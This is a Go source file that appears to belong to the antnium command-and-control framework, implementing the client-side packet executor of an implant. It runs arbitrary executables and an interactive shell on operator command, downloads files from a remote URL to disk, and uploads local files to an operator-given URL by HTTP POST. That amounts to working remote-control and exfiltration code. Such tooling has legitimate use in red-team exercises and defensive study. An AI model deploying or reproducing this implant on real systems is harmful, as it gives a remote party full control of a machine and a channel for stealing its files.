package executor

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strconv"

	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

type PacketExecutor struct {
	interactiveShell InteractiveShell
}

func MakePacketExecutor() PacketExecutor {
	interactiveShell := makeInteractiveShell()
	packetExecutor := PacketExecutor{
		interactiveShell,
	}
	return packetExecutor
}

// Execute will execute the packet according to its PacketType
// and return the packet with packet.Response set containing the details of the execution
// and error when something went wrong
func (s *PacketExecutor) Execute(packet model.Packet) (model.Packet, error) {
	var err error

	log.WithFields(log.Fields{
		"packet": packet,
	}).Info("Execute")

	if packet.PacketType == "ping" {
		packet.Response, err = s.actionPing(packet.Arguments)
	} else if packet.PacketType == "test" {
		packet.Response, err = s.actionTest(packet.Arguments)
	} else if packet.PacketType == "exec" {
		packet.Response, err = s.actionExec(packet.Arguments)
	} else if packet.PacketType == "fileupload" {
		packet.Response, err = s.actionFileupload(packet.Arguments)
	} else if packet.PacketType == "filedownload" {
		packet.Response, err = s.actionFiledownload(packet.Arguments)
	} else if packet.PacketType == "iOpen" {
		packet.Response, err = s.actionInteractiveShellOpen(packet.Arguments)
	} else if packet.PacketType == "iIssue" {
		packet.Response, err = s.actionInteractiveShellIssue(packet.Arguments)
	} else {
		packet.Response["response"] = "packet not found: " + packet.PacketType
	}

	// Add any errors to the packet response
	if err != nil {
		packet.Response["error"] = err.Error()
		return packet, err
	}

	return packet, nil
}

func (s *PacketExecutor) actionInteractiveShellOpen(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	_, force := packetArgument["force"]

	if s.interactiveShell.AlreadyOpen() && !force {
		return ret, fmt.Errorf("already_open")
	} else {
		if s.interactiveShell.AlreadyOpen() {
			s.interactiveShell.execCmd.Process.Kill()
		}
		stdout, stderr, err := s.interactiveShell.open()
		if err != nil {
			return ret, err
		}

		ret["stdout"] = stdout
		ret["stderr"] = stderr
		return ret, nil
	}
}

func (s *PacketExecutor) actionInteractiveShellIssue(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	commandline, ok := packetArgument["commandline"]
	if !ok {
		return ret, fmt.Errorf("No argument 'commandline' given")
	}

	stdout, stderr, err := s.interactiveShell.issue(commandline)
	if err != nil {
		return ret, err
	}

	ret["stdout"] = stdout
	ret["stderr"] = stderr

	return ret, nil
}

func (s *PacketExecutor) actionPing(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	ret["response"] = "ping answer"
	return ret, nil
}

func (s *PacketExecutor) actionTest(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	ret["response"] = "test answer"
	return ret, nil
}

func (s *PacketExecutor) actionExec(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	_, ok := packetArgument["executable"]
	if !ok {
		return ret, fmt.Errorf("No argument 'executable' given")
	}
	executable, args, err := MakePacketArgumentFrom(packetArgument)
	if err != nil {
		return ret, fmt.Errorf("Invalid packet arguments")
	}

	// Execute and return result
	cmd := exec.Command(executable, args...)
	stdout, err := cmd.CombinedOutput() // also includes stderr for now
	if err != nil {
		// If program didnt exit nicely
		ret["stdout"] = windowsToString(stdout)
		return ret, err
	} else {
		if len(stdout) == 0 {
			ret["stdout"] = "<no stdout, success>"
		} else {
			ret["stdout"] = windowsToString(stdout)
		}
		return ret, nil
	}
}

func (s *PacketExecutor) actionFiledownload(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	remoteurl, ok := packetArgument["remoteurl"]
	if !ok {
		return ret, fmt.Errorf("No argument 'remoteUrl' given")
	}
	destination, ok := packetArgument["destination"]
	if !ok {
		return ret, fmt.Errorf("No argument 'destination' given")
	}

	// Download and write file
	resp, err := http.Get(remoteurl)
	if err != nil {
		return ret, err
	}
	defer resp.Body.Close()
	out, err := os.Create(destination)
	if err != nil {
		return ret, err
	}
	defer out.Close()
	written, err := io.Copy(out, resp.Body)
	if err != nil {
		return ret, err
	}

	ret["response"] = fmt.Sprintf("Written %d bytes", written)
	return ret, nil
}

func (s *PacketExecutor) actionFileupload(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	remoteurl, ok := packetArgument["remoteurl"]
	if !ok {
		return ret, fmt.Errorf("No argument 'remoteurl' given")
	}
	source, ok := packetArgument["source"]
	if !ok {
		return ret, fmt.Errorf("No argument 'source' given")
	}

	client := &http.Client{}
	data, err := os.Open(source)
	if err != nil {
		return ret, err
	}
	req, err := http.NewRequest("POST", remoteurl, data)
	if err != nil {
		return ret, err
	}
	resp, err := client.Do(req)
	if err != nil {
		return ret, err
	}
	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return ret, err
	}

	ret["response"] = fmt.Sprintf("Status: %s", resp.Status)
	return ret, nil
}

func MakePacketArgumentFrom(packetArgument model.PacketArgument) (string, []string, error) {
	args := make([]string, 0)

	executable, ok := packetArgument["executable"]
	if !ok {
		return "", nil, fmt.Errorf("No executable given")
	}

	n := 0
	for {
		nr := strconv.Itoa(n)
		key := "param" + nr
		_, ok := packetArgument[key]
		if ok {
			args = append(args, packetArgument[key])
		} else {
			break
		}
		n = n + 1
	}

	return executable, args, nil
}
